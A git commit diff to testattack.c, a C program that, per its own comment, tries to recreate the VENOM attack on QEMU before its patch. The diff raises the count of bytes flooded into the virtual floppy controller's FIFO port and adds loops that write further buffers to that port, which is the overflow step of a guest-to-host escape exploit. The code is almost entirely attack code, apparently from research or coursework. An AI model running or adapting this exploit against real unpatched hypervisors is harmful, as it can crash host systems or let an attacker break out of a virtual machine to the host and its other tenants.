fa471db4e6605ef0dbc24b95de404aa40390d93a
yihao <yzhng127@illinois.edu>
2015-07-09 15:35:10 -0500

    aa

--- testattack.c
+++ testattack.c
@@ -6,12 +6,14 @@ It's aim is to exploit and recreate possible Venom attack on QEMU before patch
 #define FIFO 0x3f5
 #define RDID 0x0a
 #define SPC_COMMAND 0x8e
-#define MAX_COUNT 1000
+#define MAX_COUNT 0x700
 #define TEST_VAL  0x11
 #define FD_CMD_READ 0x06
 #define WRITE 0x05
 
 int main(void){
+        char ctx[8] = {};
+        char cb[8] = {};
         iopl(3);
         ioperm(FIFO, 1, 1);
 	// printf("write spc_command to port\n");
@@ -21,6 +23,12 @@ int main(void){
         printf("into loop\n");
         for(i=0; i<MAX_COUNT; i++ ){
                 outb(TEST_VAL,0x3f5);
+        }
+        for(i=0; i< 8; i++){
+                outb(ctx[i], FIFO);
+        }
+        for(i=0; i< 8; i++){
+                outb(cb[i], FIFO);
         }
         // outb(TEST_VAL, FIFO);
         // outb(RDID, FIFO);
